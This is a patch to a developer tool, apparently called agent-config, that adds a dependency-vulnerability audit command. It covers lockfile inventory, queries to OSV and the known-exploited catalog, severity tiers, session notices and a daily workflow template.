@@ -945,7 +945,7 @@ index 0000000000000000000000000000000000000000..1d131a6bdc29ef919431968f20432e74
 +      measured figures, and the evidence artifact the status rests on is
 +      committed.
 diff --git a/agents/roadmaps/road-to-advisories-heard-the-same-day.md b/agents/roadmaps/road-to-advisories-heard-the-same-day.md
-index 69f5532994068a5f5a65deb43534a4a1281f284f..25872a358101a7374af81800dea8439eab1367da 100644
+index 69f5532994068a5f5a65deb43534a4a1281f284f..398ca80aba103385d6d762c49a75a80da7943fe6 100644
 --- a/agents/roadmaps/road-to-advisories-heard-the-same-day.md
 +++ b/agents/roadmaps/road-to-advisories-heard-the-same-day.md
 @@ -86,13 +86,14 @@ project.
@@ -1121,9 +1121,10 @@ index 69f5532994068a5f5a65deb43534a4a1281f284f..25872a358101a7374af81800dea8439e
 +- [x] **5.1 `/audit deps`** under the approved `audit` verb (C5): inventory,
        findings by tier, the evidence per finding, and source health.
        verify: the command file exists under `src/domains/` with `visibility:
-       visible` and `./scripts-run src/scripts/lint_command_verbs` passes.
+-      visible` and `./scripts-run src/scripts/lint_command_verbs` passes.
 -- [ ] **5.2 Gap report over what the project already runs**: platform alerts
-+      *One command under the approved verb, `deps` its argument — a sub-command `deps` would be a new verb under ADR-041.*
++      advanced` and `./scripts-run src/scripts/lint_command_verbs` passes.
++      *One command under the approved verb, `deps` its argument — a sub-command `deps` would be a new verb under ADR-041. Shipped `advanced`, not `visible` as first written: the session notice and `/audit deps fix` are how a user meets it, and a new visible command joins the consumer's top-level menu, which this change has no reason to grow (corrected 2026-10-21 by an R2 review finding).*
 +      <!-- receipt: class=R3 · shadow · would-skip=none · bound=override-list path: src/config/agent-settings.template.yml -->
 +- [x] **5.2 Gap report over what the project already runs**: platform alerts
        on, security updates ungrouped, a cooldown configured, Composer
@@ -1587,10 +1588,10 @@ index e7b3387857d8d04b904af768073c0146a5595e0d..b990e1eb2c5ab6a81a81e77addea7057
  | Worktree registry with lease and heartbeat, per-process PIDs | CHANGED | The session register already carries heartbeats; 3.4 adds a registry line, not a second lease store. |
 diff --git a/dist/agent-src/commands/audit.md b/dist/agent-src/commands/audit.md
 new file mode 100644
-index 0000000000000000000000000000000000000000..4a474e27e5aab8383fcb60cd5ce716e1a900127d
+index 0000000000000000000000000000000000000000..8b5682dcc2b6d3cae8846cf1fd5053decc527fcc
 --- /dev/null
 +++ b/dist/agent-src/commands/audit.md
-@@ -0,0 +1,107 @@
+@@ -0,0 +1,108 @@
 +---
 +model_tier: medium
 +name: audit
@@ -1666,8 +1667,9 @@ index 0000000000000000000000000000000000000000..4a474e27e5aab8383fcb60cd5ce716e1
 +
 +### 2. Tiers decide the tone
 +
-+`T0` — act today (malware, a critical runtime pre-announcement, a critical
-+runtime fix available, a known-exploited advisory). `T1` — today. `T2` — the
++`T0` — act today (malware, a critical runtime pre-announcement, a critical fix
++available for a direct runtime dependency, or a high one that is known-exploited
++— KEV raises a finding one tier). `T1` — today. `T2` — the
 +digest. `T3` — the ledger. Lead with T0, then T1; mention the T2 count; leave T3
 +unless asked.
 +
@@ -1964,10 +1966,10 @@ index b7401792a47362b5786b866d4d97d22acdf2012b..0e7cf0f68b097bb9ba6f460dc999bd1e
  `safe` requires all of: on a branch, merged into the trunk, clean, inside a
 diff --git a/dist/agent-src/templates/github-workflows/advisories-daily.yml b/dist/agent-src/templates/github-workflows/advisories-daily.yml
 new file mode 100644
-index 0000000000000000000000000000000000000000..29ce5b20a6537036fba53bd85243d4dd164d8342
+index 0000000000000000000000000000000000000000..7dc1a804061e55cbac95a6760cf06e969ae9e3ec
 --- /dev/null
 +++ b/dist/agent-src/templates/github-workflows/advisories-daily.yml
-@@ -0,0 +1,66 @@
+@@ -0,0 +1,67 @@
 +# Advisories, daily — template shipped by agent-config
 +#
 +# Copy this file to `.github/workflows/advisories-daily.yml` in the consumer
@@ -1980,7 +1982,8 @@ index 0000000000000000000000000000000000000000..29ce5b20a6537036fba53bd85243d4dd
 +# Node release feeds, the whole CISA known-exploited catalog from www.cisa.gov
 +# matched locally; private package names are never sent), then opens or
 +# updates ONE issue for T0 findings — malware, a critical runtime
-+# pre-announcement, a critical fix available, a known-exploited advisory.
++# pre-announcement, a critical fix for a direct dependency, a high finding that
++# is known-exploited (KEV raises one tier).
 +#
 +# What it never does: merge, push, open a PR, change a dependency, or run a
 +# package manager's install. Carrying a finding to a fix is `/audit deps fix
@@ -2631,10 +2634,10 @@ index e5f24f69af6b3f3eeded1da531d8cb422464f03c..ea401a3ed79e237b983a23f160fe8863
  
 diff --git a/src/agent-src/templates/github-workflows/advisories-daily.yml b/src/agent-src/templates/github-workflows/advisories-daily.yml
 new file mode 100644
-index 0000000000000000000000000000000000000000..29ce5b20a6537036fba53bd85243d4dd164d8342
+index 0000000000000000000000000000000000000000..7dc1a804061e55cbac95a6760cf06e969ae9e3ec
 --- /dev/null
 +++ b/src/agent-src/templates/github-workflows/advisories-daily.yml
-@@ -0,0 +1,66 @@
+@@ -0,0 +1,67 @@
 +# Advisories, daily — template shipped by agent-config
 +#
 +# Copy this file to `.github/workflows/advisories-daily.yml` in the consumer
@@ -2647,7 +2650,8 @@ index 0000000000000000000000000000000000000000..29ce5b20a6537036fba53bd85243d4dd
 +# Node release feeds, the whole CISA known-exploited catalog from www.cisa.gov
 +# matched locally; private package names are never sent), then opens or
 +# updates ONE issue for T0 findings — malware, a critical runtime
-+# pre-announcement, a critical fix available, a known-exploited advisory.
++# pre-announcement, a critical fix for a direct dependency, a high finding that
++# is known-exploited (KEV raises one tier).
 +#
 +# What it never does: merge, push, open a PR, change a dependency, or run a
 +# package manager's install. Carrying a finding to a fix is `/audit deps fix
@@ -2970,10 +2974,10 @@ index 5bbc2942ea437561b5e3d3fb946e418a5ab3fea2..8e098a17a15e51f64c7b198e054d555b
  }
 diff --git a/src/domains/engineering-base/audit/command.md b/src/domains/engineering-base/audit/command.md
 new file mode 100644
-index 0000000000000000000000000000000000000000..4a474e27e5aab8383fcb60cd5ce716e1a900127d
+index 0000000000000000000000000000000000000000..8b5682dcc2b6d3cae8846cf1fd5053decc527fcc
 --- /dev/null
 +++ b/src/domains/engineering-base/audit/command.md
-@@ -0,0 +1,107 @@
+@@ -0,0 +1,108 @@
 +---
 +model_tier: medium
 +name: audit
@@ -3049,8 +3053,9 @@ index 0000000000000000000000000000000000000000..4a474e27e5aab8383fcb60cd5ce716e1
 +
 +### 2. Tiers decide the tone
 +
-+`T0` — act today (malware, a critical runtime pre-announcement, a critical
-+runtime fix available, a known-exploited advisory). `T1` — today. `T2` — the
++`T0` — act today (malware, a critical runtime pre-announcement, a critical fix
++available for a direct runtime dependency, or a high one that is known-exploited
++— KEV raises a finding one tier). `T1` — today. `T2` — the
 +digest. `T3` — the ledger. Lead with T0, then T1; mention the T2 count; leave T3
 +unless asked.
 +
@@ -3155,7 +3160,7 @@ index 054db20627ecfae8846404634129f083a1beff5d..cd9be99b71dead0e81fc2af3920bcb13
  - **`bug-fix`** — Plan and implement a bug fix — based on investigation, with quality checks and test verification
  - **`bug-investigate`** — Investigate a bug — auto-detect ticket from branch, gather Jira/Sentry/description context, trace root cause
 diff --git a/src/domains/meta/pack.yaml b/src/domains/meta/pack.yaml
-index fb64250a64d0e2a3cb883fab32c738ad6f0ebaa1..7921e1c70d1ad8f6849c6e798b887a2be18e487b 100644
+index fb64250a64d0e2a3cb883fab32c738ad6f0ebaa1..3a680f82ef26a7ab75607c692fd2797aad9dd766 100644
 --- a/src/domains/meta/pack.yaml
 +++ b/src/domains/meta/pack.yaml
 @@ -1,5 +1,5 @@
@@ -3184,14 +3189,14 @@ index fb64250a64d0e2a3cb883fab32c738ad6f0ebaa1..7921e1c70d1ad8f6849c6e798b887a2b
    basis: chars/4
    catalog_tokens: 3649
 -  commands_tokens: 255212
-+  commands_tokens: 256513
++  commands_tokens: 256531
    other_tokens: 1304
    rules_tokens: 63878
 -  total_tokens: 324043
-+  total_tokens: 325344
++  total_tokens: 325362
  trust_level_default: core
 diff --git a/src/scripts/_dispatch.bash b/src/scripts/_dispatch.bash
-index bbd77aaced2ce32b8857e8f192cf62a768457242..61c020cec096060bd85bfccd6c6e1f4b60a19032 100755
+index bbd77aaced2ce32b8857e8f192cf62a768457242..0d92ce7273c8a4283cdd153c2d984f5f5d8547d4 100755
 --- a/src/scripts/_dispatch.bash
 +++ b/src/scripts/_dispatch.bash
 @@ -82,6 +82,13 @@ TS-shell native (run via the installed `agent-config` binary):
@@ -3237,12 +3242,42 @@ index bbd77aaced2ce32b8857e8f192cf62a768457242..61c020cec096060bd85bfccd6c6e1f4b
      roadmap:context)         cmd_roadmap_context "$@" ;;
      roadmap:progress)        cmd_roadmap_progress "$@" ;;
      roadmap:progress-check)  cmd_roadmap_progress_check "$@" ;;
+@@ -1759,20 +1781,21 @@ run_update_check_banner() {
+   esac
+   # Best-effort: bundle first, then a dev-tree tsx. No `npx tsx` last resort —
+   # same reason as maybe_pin_reexec: npx runs against the CONSUMER's npm config.
+-  local runner=""
+-  local target=""
++  local -a run=()
+   local aux
+   aux="$(delegate_aux_bundle 'check_update_banner.js')"
+   if [[ -n "$aux" ]]; then
+-    runner="node"
+-    target="$aux"
+-  elif [[ -x "$PACKAGE_ROOT/node_modules/.bin/tsx" && -f "$PACKAGE_ROOT/src/scripts/check_update_banner.ts" ]]; then
+-    runner="$PACKAGE_ROOT/node_modules/.bin/tsx"
+-    target="$PACKAGE_ROOT/src/scripts/check_update_banner.ts"
++    run=(node "$aux")
++  elif [[ -f "$PACKAGE_ROOT/node_modules/tsx/dist/loader.mjs" && -f "$PACKAGE_ROOT/src/scripts/check_update_banner.ts" ]]; then
++    # The loader, not the tsx CLI: the CLI runs the script in a child whose
++    # fd 3 is its IPC channel, and fd 3 is where the notice goes.
++    run=(node --import "file://$PACKAGE_ROOT/node_modules/tsx/dist/loader.mjs" "$PACKAGE_ROOT/src/scripts/check_update_banner.ts")
+   else
+     return 0
+   fi
+-  "$runner" "$target" --cwd "$CONSUMER_ROOT" 2>/dev/null || true
++  # fd 3 is the real stderr: the advisory notice is written there and stamped
++  # only on success; everything else the banner process prints stays discarded.
++  "${run[@]}" --cwd "$CONSUMER_ROOT" 3>&2 2>/dev/null || true
+ }
+ 
+ # Global `--root <path>` / `--root=<path>` parsing (Step 8 A3).
 diff --git a/src/scripts/_lib/advisory_inventory.ts b/src/scripts/_lib/advisory_inventory.ts
 new file mode 100644
-index 0000000000000000000000000000000000000000..a464b739095a342f01ed96f194abe309abdbf71a
+index 0000000000000000000000000000000000000000..76096e3b483c6dd5a43c18e4c8d4065d4a8a212a
 --- /dev/null
 +++ b/src/scripts/_lib/advisory_inventory.ts
-@@ -0,0 +1,386 @@
+@@ -0,0 +1,405 @@
 +/**
 + * What a project actually runs — the input to every advisory question
 + * (road-to-advisories-heard-the-same-day Phase 1).
@@ -3589,6 +3624,25 @@ index 0000000000000000000000000000000000000000..a464b739095a342f01ed96f194abe309
 +}
 +
 +/** Read the whole inventory. Unreadable files are skipped, never guessed. */
++/**
++ * Lockfiles this inventory cannot read: yarn, pnpm and bun locks, and an npm
++ * lock in the v1 format. Their packages are not in the inventory, so a refresh
++ * must say "not checked" for them — an empty list from a lock nobody read would
++ * otherwise read as a clean project.
++ */
++export function unsupportedLockfiles(root: string): string[] {
++    const out = walk(root, (n) => n === 'yarn.lock' || n === 'pnpm-lock.yaml' || n === 'bun.lock' || n === 'bun.lockb');
++    for (const rel of walk(root, (n) => n === 'package-lock.json')) {
++        try {
++            const v = (JSON.parse(fs.readFileSync(path.join(root, rel), 'utf-8')) as { lockfileVersion?: unknown }).lockfileVersion;
++            if (v === 1 || v === undefined) out.push(rel);
++        } catch {
++            out.push(rel);
++        }
++    }
++    return out.sort();
++}
++
 +export function readInventory(root: string): Inventory {
 +    const hash = createHash('sha256');
 +    const finger = createHash('sha256');
@@ -3631,10 +3685,10 @@ index 0000000000000000000000000000000000000000..a464b739095a342f01ed96f194abe309
 +}
 diff --git a/src/scripts/_lib/advisory_notice.ts b/src/scripts/_lib/advisory_notice.ts
 new file mode 100644
-index 0000000000000000000000000000000000000000..10bfaadab197f79ec5508786784902b0f7faedc5
+index 0000000000000000000000000000000000000000..f47de38256798b4bdfe90229d966debf911834d6
 --- /dev/null
 +++ b/src/scripts/_lib/advisory_notice.ts
-@@ -0,0 +1,258 @@
+@@ -0,0 +1,262 @@
 +/**
 + * The read-only half of advisories — what a session start may do
 + * (road-to-advisories-heard-the-same-day Phase 4).
@@ -3655,7 +3709,8 @@ index 0000000000000000000000000000000000000000..10bfaadab197f79ec5508786784902b0
 +import type { SourceReport } from './advisory_sources.js';
 +import type { Acceptance, Finding, Ledger } from './advisory_verdicts.js';
 +import { git_common_dir } from './git_common_dir.js';
-+import { mergedNotDeployed, type Remediations } from './security_fix.js';
++import type { Remediations } from './security_fix.js';
++import { mergedNotDeployed } from './undeployed_fixes.js';
 +
 +export type AdvisoriesMode = 'notify' | 'off';
 +export type AdvisoriesEgress = 'query' | 'none';
@@ -3865,7 +3920,7 @@ index 0000000000000000000000000000000000000000..10bfaadab197f79ec5508786784902b0
 +}
 +
 +/** Shown once per notice: the stamp records which notice this checkout already printed. */
-+export function sessionNotice(root: string, now: Date = new Date()): string | null {
++export function sessionNotice(root: string, now: Date = new Date(), deliver?: (text: string) => boolean): string | null {
 +    if (readAdvisorySettings(root).mode === 'off') return null;
 +    const state = readState(root);
 +    if (state === null) return null;
@@ -3885,6 +3940,9 @@ index 0000000000000000000000000000000000000000..10bfaadab197f79ec5508786784902b0
 +    const stable = lines.map((l) => l.replace(/\b\d+ (?:h|days?|day\(s\))\b/g, '#')).join('\n');
 +    const id = `${now.toISOString().slice(0, 10)}|${createHash('sha256').update(stable).digest('hex').slice(0, 16)}`;
 +    if (shown === id) return null;
++    // Stamped only once the text reached someone: a caller that could not
++    // deliver it leaves the notice for the next surface.
++    if (deliver !== undefined && !deliver(lines.join('\n'))) return null;
 +    try {
 +        fs.writeFileSync(stamp, `${id}\n`);
 +    } catch {
@@ -3895,10 +3953,10 @@ index 0000000000000000000000000000000000000000..10bfaadab197f79ec5508786784902b0
 +
 diff --git a/src/scripts/_lib/advisory_sources.ts b/src/scripts/_lib/advisory_sources.ts
 new file mode 100644
-index 0000000000000000000000000000000000000000..860c93730997a65c3f97f60d5100f029eb3bbe6b
+index 0000000000000000000000000000000000000000..170b688bd83421ad22c8cac3532b508bc986dcf8
 --- /dev/null
 +++ b/src/scripts/_lib/advisory_sources.ts
-@@ -0,0 +1,703 @@
+@@ -0,0 +1,717 @@
 +/**
 + * Ask the authorities, carry nothing (road-to-advisories-heard-the-same-day
 + * Phase 2).
@@ -4075,10 +4133,12 @@ index 0000000000000000000000000000000000000000..860c93730997a65c3f97f60d5100f029
 +        }
 +        const line = (name: string): number => list.find((e) => e.name === name)?.line ?? 1;
 +        // Several resolved versions of one name (nested duplicates): the audit
-+        // does not say which one, so the version is unknown, never the first.
-+        const version = (name: string): string | null => {
-+            const vs = new Set(list.filter((e) => e.name === name).map((e) => e.version));
-+            return vs.size === 1 ? ([...vs][0] ?? null) : null;
++        // does not say which one, so each installed version gets its own finding
++        // and merges with OSV's per-version answer for the same advisory.
++        const versionsOf = (name: string): Array<{ version: string | null; line: number }> => {
++            const seen = new Map<string, number>();
++            for (const e of list) if (e.name === name && e.version !== null && !seen.has(e.version)) seen.set(e.version, e.line);
++            return seen.size === 0 ? [{ version: null, line: line(name) }] : [...seen].map(([version, l]) => ({ version, line: l }));
 +        };
 +        if (npm) {
 +            const vulns = (doc as { vulnerabilities?: Record<string, { via?: unknown[]; fixAvailable?: unknown }> }).vulnerabilities ?? {};
@@ -4089,23 +4149,24 @@ index 0000000000000000000000000000000000000000..860c93730997a65c3f97f60d5100f029
 +                    const ghsa = /GHSA-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}/i.exec(o.url ?? '')?.[0];
 +                    if (ghsa === undefined) continue;
 +                    const fix = v.fixAvailable as { name?: string; version?: string } | boolean | undefined;
-+                    findings.push({
-+                        id: `GHSA-${ghsa.slice(5).toLowerCase()}`,
-+                        aliases: [],
-+                        kind: 'vulnerability',
-+                        ecosystem: 'npm',
-+                        package: name,
-+                        version: version(name),
-+                        severity: severityOf(o.severity),
-+                        score: numberOrNull(o.cvss?.score),
-+                        kev: false,
-+                        fixed: typeof fix === 'object' && fix?.name === name ? (fix.version ?? null) : null,
-+                        date: null,
-+                        source,
-+                        modified: null,
-+                        file,
-+                        line: line(name),
-+                    });
++                    for (const at of versionsOf(name))
++                        findings.push({
++                            id: `GHSA-${ghsa.slice(5).toLowerCase()}`,
++                            aliases: [],
++                            kind: 'vulnerability',
++                            ecosystem: 'npm',
++                            package: name,
++                            version: at.version,
++                            severity: severityOf(o.severity),
++                            score: numberOrNull(o.cvss?.score),
++                            kev: false,
++                            fixed: typeof fix === 'object' && fix?.name === name ? (fix.version ?? null) : null,
++                            date: null,
++                            source,
++                            modified: null,
++                            file,
++                            line: at.line,
++                        });
 +                }
 +            }
 +        } else {
@@ -4114,23 +4175,24 @@ index 0000000000000000000000000000000000000000..860c93730997a65c3f97f60d5100f029
 +                for (const a of list2) {
 +                    const id = String(a.advisoryId ?? '');
 +                    if (!ID_SHAPE.test(id)) continue;
-+                    findings.push({
-+                        id,
-+                        aliases: a.cve && ID_SHAPE.test(a.cve) ? [a.cve] : [],
-+                        kind: 'vulnerability',
-+                        ecosystem: 'Packagist',
-+                        package: name,
-+                        version: version(name),
-+                        severity: severityOf(a.severity),
-+                        score: null,
-+                        kev: false,
-+                        fixed: null,
-+                        date: null,
-+                        source,
-+                        modified: null,
-+                        file,
-+                        line: line(name),
-+                    });
++                    for (const at of versionsOf(name))
++                        findings.push({
++                            id,
++                            aliases: a.cve && ID_SHAPE.test(a.cve) ? [a.cve] : [],
++                            kind: 'vulnerability',
++                            ecosystem: 'Packagist',
++                            package: name,
++                            version: at.version,
++                            severity: severityOf(a.severity),
++                            score: null,
++                            kev: false,
++                            fixed: null,
++                            date: null,
++                            source,
++                            modified: null,
++                            file,
++                            line: at.line,
++                        });
 +                }
 +            }
 +        }
@@ -4282,8 +4344,16 @@ index 0000000000000000000000000000000000000000..860c93730997a65c3f97f60d5100f029
 +                    const modified = String(ref.modified ?? '');
 +                    let vuln = cache.get(id)?.modified === modified ? cache.get(id)!.vuln : null;
 +                    if (vuln === null) {
-+                        const det = await fetcher(`https://api.osv.dev/v1/vulns/${encodeURIComponent(id)}`, { timeoutMs: opts.timeoutMs ?? 10000 });
-+                        const got = det.status === 200 ? (JSON.parse(await det.text()) as OsvVuln) : null;
++                        // A detail that throws (timeout, network, the query deadline, bad
++                        // JSON) is a missing detail — the batch's answer stands.
++                        let det: FetchResponse = { status: 0, text: async () => '' };
++                        let got: OsvVuln | null = null;
++                        try {
++                            det = await fetcher(`https://api.osv.dev/v1/vulns/${encodeURIComponent(id)}`, { timeoutMs: opts.timeoutMs ?? 10000 });
++                            got = det.status === 200 ? (JSON.parse(await det.text()) as OsvVuln) : null;
++                        } catch {
++                            got = null;
++                        }
 +                        // Validated before it is cached: a detail for another ID, or
 +                        // one without the shape read below, is treated as missing.
 +                        if (got !== null && got.id === id && (got.affected === undefined || Array.isArray(got.affected))) {
@@ -4321,7 +4391,9 @@ index 0000000000000000000000000000000000000000..860c93730997a65c3f97f60d5100f029
 +        }
 +        return { findings, report: partial === null ? { source: 'osv', status: 'ok', reason: null } : { source: 'osv', status: 'error', reason: partial } };
 +    } catch (e) {
-+        return { findings: [], report: { source: 'osv', status: 'unavailable', reason: (e as Error).name === 'TimeoutError' ? 'timeout' : 'network' } };
++        // What the batch already said stays said; the source is marked, never ok.
++        const reason = (e as Error).name === 'TimeoutError' ? 'timeout' : e instanceof SyntaxError ? 'unparseable' : 'network';
++        return { findings, report: { source: 'osv', status: findings.length > 0 ? 'error' : 'unavailable', reason } };
 +    }
 +}
 +
@@ -4604,10 +4676,10 @@ index 0000000000000000000000000000000000000000..860c93730997a65c3f97f60d5100f029
 +}
 diff --git a/src/scripts/_lib/advisory_verdicts.ts b/src/scripts/_lib/advisory_verdicts.ts
 new file mode 100644
-index 0000000000000000000000000000000000000000..f1f1e50ef039c3a8119c92ccdca6c42770fff2a4
+index 0000000000000000000000000000000000000000..e168b425773ef38d7426cee0f501f36b4621b4a3
 --- /dev/null
 +++ b/src/scripts/_lib/advisory_verdicts.ts
-@@ -0,0 +1,333 @@
+@@ -0,0 +1,346 @@
 +/**
 + * From raw source answers to a finding a person can act on
 + * (road-to-advisories-heard-the-same-day Phases 2.2–2.5 and 3).
@@ -4652,6 +4724,8 @@ index 0000000000000000000000000000000000000000..f1f1e50ef039c3a8119c92ccdca6c427
 +    kev: boolean;
 +    date: string | null;
 +    scope: 'runtime' | 'dev' | null;
++    /** `false` when the project's manifest is read and does not declare it (transitive); unknown counts as direct. */
++    direct?: boolean | null;
 +    sources: string[];
 +    /** Newest source-side `modified` stamp; a change means a corrected advisory. */
 +    modified: string | null;
@@ -4729,7 +4803,7 @@ index 0000000000000000000000000000000000000000..f1f1e50ef039c3a8119c92ccdca6c427
 + * Deterministic tiers (3.1). T0 interrupts, T1 is today, T2 is the digest, T3
 + * is the ledger. KEV raises a tier and never lowers one.
 + */
-+export function tierOf(f: Pick<Finding, 'verdict' | 'severity' | 'score' | 'kev' | 'scope' | 'ecosystem'>): Tier {
++export function tierOf(f: Pick<Finding, 'verdict' | 'severity' | 'score' | 'kev' | 'scope' | 'ecosystem'> & { direct?: boolean | null }): Tier {
 +    const runtimeScope = f.scope !== 'dev';
 +    const critical = f.severity === 'critical' || (f.score !== null && f.score >= 9);
 +    const high = f.severity === 'high' || (f.score !== null && f.score >= 7);
@@ -4750,7 +4824,8 @@ index 0000000000000000000000000000000000000000..f1f1e50ef039c3a8119c92ccdca6c427
 +            tier = 'T2';
 +            break;
 +        default:
-+            if (critical && runtimeScope && (f.verdict === 'fix-available' || f.verdict === 'fix-fresh')) tier = 'T0';
++            // T0 is runtime-DIRECT with a fix (3.1); a known transitive is T1.
++            if (critical && runtimeScope && f.direct !== false && (f.verdict === 'fix-available' || f.verdict === 'fix-fresh')) tier = 'T0';
 +            else if ((critical || high) && runtimeScope) tier = 'T1';
 +            else if (critical || high || f.severity === 'moderate') tier = 'T2';
 +            else tier = 'T3';
@@ -4773,6 +4848,11 @@ index 0000000000000000000000000000000000000000..f1f1e50ef039c3a8119c92ccdca6c427
 +        const id = canonical(ids);
 +        const first = items[0]!;
 +        const scope = inventory.find((e) => e.name === first.package && e.file === first.file)?.scope ?? null;
++        // Direct when the manifest beside the lockfile declares it; transitive
++        // only when that manifest was read and does not.
++        const dir = first.file.includes('/') ? first.file.slice(0, first.file.lastIndexOf('/') + 1) : '';
++        const declared = inventory.filter((e) => e.provenance === 'declared' && e.ecosystem === first.ecosystem && e.file === `${dir}package.json`);
++        const direct = declared.length === 0 ? null : declared.some((e) => e.name === first.package);
 +        const { verdict, note } = verdictOf(items, now, opts.acceptances ?? [], ids);
 +        const base = {
 +            verdict,
@@ -4780,6 +4860,7 @@ index 0000000000000000000000000000000000000000..f1f1e50ef039c3a8119c92ccdca6c427
 +            score: items.map((f) => f.score).find((s) => s !== null) ?? null,
 +            kev: items.some((f) => f.kev),
 +            scope,
++            direct,
 +            ecosystem: first.ecosystem,
 +        };
 +        out.push({
@@ -4935,7 +5016,11 @@ index 0000000000000000000000000000000000000000..f1f1e50ef039c3a8119c92ccdca6c427
 +export function validateAcceptance(a: Partial<Acceptance>): string | null {
 +    if (typeof a.id !== 'string' || a.id === '') return 'an acceptance names the finding ID';
 +    if (typeof a.reason !== 'string' || a.reason.trim().length < 10) return 'an acceptance carries a reason of at least a sentence';
-+    if (/\b(grep|not (found|used|reachable)|no (hits|matches|usage))\b/i.test(a.reason)) {
++    // A search that found nothing is never a reason. "Not reachable" is one only
++    // with the mechanism named after it — a bare claim is the same grep in prose.
++    const searched = /\b(grep|not found|no (hits|matches))\b/i.test(a.reason);
++    const bare = /\b(not (used|reachable)|no usage)\b/i.test(a.reason) && a.reason.trim().split(/\s+/).length < 8;
++    if (searched || bare) {
 +        return 'absence of a hit is not unreachability — name what makes the code path unreachable';
 +    }
 +    if (typeof a.expires !== 'string' || !/^\d{4}-\d{2}-\d{2}$/.test(a.expires)) return 'an acceptance carries an expiry day (YYYY-MM-DD)';
@@ -4943,10 +5028,10 @@ index 0000000000000000000000000000000000000000..f1f1e50ef039c3a8119c92ccdca6c427
 +}
 diff --git a/src/scripts/_lib/security_fix.ts b/src/scripts/_lib/security_fix.ts
 new file mode 100644
-index 0000000000000000000000000000000000000000..72429e6a0cd0a5acda1d3b7e3e52cf95ff27a72a
+index 0000000000000000000000000000000000000000..6387a7f25c94db0ad8c84de6c84cd930ddffa87d
 --- /dev/null
 +++ b/src/scripts/_lib/security_fix.ts
-@@ -0,0 +1,436 @@
+@@ -0,0 +1,414 @@
 +/**
 + * The decidable half of carrying a security finding to a merged, deployed fix
 + * (road-to-security-fixes-carried-to-the-merge).
@@ -5284,6 +5369,8 @@ index 0000000000000000000000000000000000000000..72429e6a0cd0a5acda1d3b7e3e52cf95
 +    sources?: string[];
 +    /** The commit the fix started from, when the fix shares a branch with other work (route `current-branch`). */
 +    base?: string | null;
++    /** Workflow files the plan itself edits (a runtime pin, an action ref) — the only ones a fix may touch there. */
++    files?: string[];
 +}
 +
 +export type Remediations = Record<string, Remediation>;
@@ -5345,31 +5432,7 @@ index 0000000000000000000000000000000000000000..72429e6a0cd0a5acda1d3b7e3e52cf95
 +    return r;
 +}
 +
-+/** Merged but not deployed after this long stays in the notice (3.2). */
-+export const UNDEPLOYED_AFTER_HOURS = 24;
-+
-+export interface UndeployedFix {
-+    id: string;
-+    mergeSha: string | null;
-+    hours: number;
-+}
-+
-+/** Structured rows only — the session line is rendered, and validated, by the notice module. */
-+export function mergedNotDeployed(all: Remediations, findings: Finding[], now: Date = new Date()): UndeployedFix[] {
-+    const byKey = new Map(findings.map((f) => [f.key, f]));
-+    const rows: UndeployedFix[] = [];
-+    for (const r of Object.values(all)) {
-+        if (r.state !== 'fixed-in-trunk' && r.state !== 'fixed-released') continue;
-+        const since = r.stamps['fixed-in-trunk'];
-+        if (since === undefined) continue;
-+        const hours = (now.getTime() - Date.parse(since)) / 3600000;
-+        if (!Number.isFinite(hours) || hours < UNDEPLOYED_AFTER_HOURS) continue;
-+        const f = byKey.get(r.key);
-+        if (f !== undefined && f.tier !== 'T0' && f.tier !== 'T1') continue;
-+        rows.push({ id: r.key.split('|')[0] ?? r.key, mergeSha: r.merge_sha, hours: Math.floor(hours) });
-+    }
-+    return rows;
-+}
++export { mergedNotDeployed, UNDEPLOYED_AFTER_HOURS, type UndeployedFix } from './undeployed_fixes.js';
 +
 +/** A mitigated finding reopens the moment a refresh reports a fix for it (1.5). */
 +export function reopenMitigations(all: Remediations, findings: Finding[]): string[] {
@@ -5509,6 +5572,46 @@ index 0000000000000000000000000000000000000000..e5d1c4671585cdf87075a689fb2642da
 +    if (!new RegExp(`(?:^|[\\s\`'"])${esc}(?:$|[\\s\`'"])`).test(title)) return false;
 +    const to = /\bto v?(\d+(?:\.\d+){0,3})/i.exec(title)?.[1];
 +    return to !== undefined && (compare_versions(to, fixed) ?? -1) >= 0;
++}
+diff --git a/src/scripts/_lib/undeployed_fixes.ts b/src/scripts/_lib/undeployed_fixes.ts
+new file mode 100644
+index 0000000000000000000000000000000000000000..b208d954a7d6b2076dac37468adc4975c5a3d50c
+--- /dev/null
++++ b/src/scripts/_lib/undeployed_fixes.ts
+@@ -0,0 +1,34 @@
++/**
++ * The one remediation reading a session start needs. Kept apart from
++ * `security_fix.ts` because the session notice is inlined into the hook bundle,
++ * and the routing and fix-plan code has no business there.
++ */
++
++import type { Finding } from './advisory_verdicts.js';
++import type { Remediations } from './security_fix.js';
++
++/** Merged but not deployed after this long stays in the notice (3.2). */
++export const UNDEPLOYED_AFTER_HOURS = 24;
++
++export interface UndeployedFix {
++    id: string;
++    mergeSha: string | null;
++    hours: number;
++}
++
++/** Structured rows only — the session line is rendered, and validated, by the notice module. */
++export function mergedNotDeployed(all: Remediations, findings: Finding[], now: Date = new Date()): UndeployedFix[] {
++    const byKey = new Map(findings.map((f) => [f.key, f]));
++    const rows: UndeployedFix[] = [];
++    for (const r of Object.values(all)) {
++        if (r.state !== 'fixed-in-trunk' && r.state !== 'fixed-released') continue;
++        const since = r.stamps['fixed-in-trunk'];
++        if (since === undefined) continue;
++        const hours = (now.getTime() - Date.parse(since)) / 3600000;
++        if (!Number.isFinite(hours) || hours < UNDEPLOYED_AFTER_HOURS) continue;
++        const f = byKey.get(r.key);
++        if (f !== undefined && f.tier !== 'T0' && f.tier !== 'T1') continue;
++        rows.push({ id: r.key.split('|')[0] ?? r.key, mergeSha: r.merge_sha, hours: Math.floor(hours) });
++    }
++    return rows;
 +}
 diff --git a/src/scripts/_lib/worktree_git.ts b/src/scripts/_lib/worktree_git.ts
 new file mode 100644
@@ -5707,10 +5810,10 @@ index 0000000000000000000000000000000000000000..b587874d9f8d3ab3875237f61314d45d
 +}
 diff --git a/src/scripts/advisories.ts b/src/scripts/advisories.ts
 new file mode 100644
-index 0000000000000000000000000000000000000000..1534ad89ce0127ede5f642a803df6b111688688b
+index 0000000000000000000000000000000000000000..51413026ae0056ab83802db259cfcaed50aeb333
 --- /dev/null
 +++ b/src/scripts/advisories.ts
-@@ -0,0 +1,761 @@
+@@ -0,0 +1,773 @@
 +#!/usr/bin/env tsx
 +/**
 + * `agent-config audit:deps` — advisories heard the same day
@@ -5740,7 +5843,7 @@ index 0000000000000000000000000000000000000000..1534ad89ce0127ede5f642a803df6b11
 +import * as path from 'node:path';
